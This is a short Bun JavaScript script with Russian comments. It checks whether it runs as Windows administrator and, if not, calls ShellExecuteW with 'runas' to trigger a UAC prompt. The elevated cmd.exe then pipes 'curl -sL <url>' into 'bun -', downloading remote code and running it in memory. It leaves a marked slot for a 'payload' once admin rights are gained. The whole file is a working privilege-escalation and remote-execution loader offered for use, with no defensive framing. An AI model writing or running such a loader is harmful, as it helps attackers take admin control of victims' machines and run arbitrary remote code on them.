// admin-loop.js
(async () => {
  // Динамический импорт вместо require для совместимости с ESM/Bun
  const { dlopen, FFIType, ptr } = await import("bun:ffi");

  const shell32 = dlopen("shell32.dll", {
    ShellExecuteW: {
      args: [FFIType.ptr, FFIType.ptr, FFIType.ptr, FFIType.ptr, FFIType.ptr, FFIType.i32],
      returns: FFIType.i32,
    },
  });

  const toPtr = (s) => ptr(Buffer.from(s + "\0", "utf16le"));

  const isAdmin = async () => {
    const p = Bun.spawn({ cmd: ["net", "session"], stdout: "pipe", stderr: "pipe" });
    return (await p.exited) === 0;
  };

  console.log("🚀 PID:", process.pid, "Admin:", await isAdmin());

  if (await isAdmin()) {
    console.log("✅ МЫ АДМИНЫ! Выполняем payload...");
    // Твой payload здесь
    const { stdout } = Bun.spawn({ cmd: ["whoami"] });
    console.log("User:", await new Response(stdout).text());
    
    console.log("\nНажмите Enter, чтобы выйти...");
    for await (const line of console) break; // Пауза, чтобы окно не закрылось
    return;
  }

  console.log("❌ Не админ. Запрос UAC...");

  // Рекурсивный вызов: скачиваем и запускаем В ПАМЯТИ нового процесса
  const url = "https://githubusercontent.com";
  const payload = `curl -sL ${url} | bun -`;

  const res = shell32.symbols.ShellExecuteW(
    0,
    toPtr("runas"),
    toPtr("cmd.exe"),
    toPtr("/c " + payload),
    0,
    1
  );

  console.log("ShellExecuteW код:", res);
  // Завершаем старый процесс, так как новый уже запущен через UAC
  process.exit(0);
})();
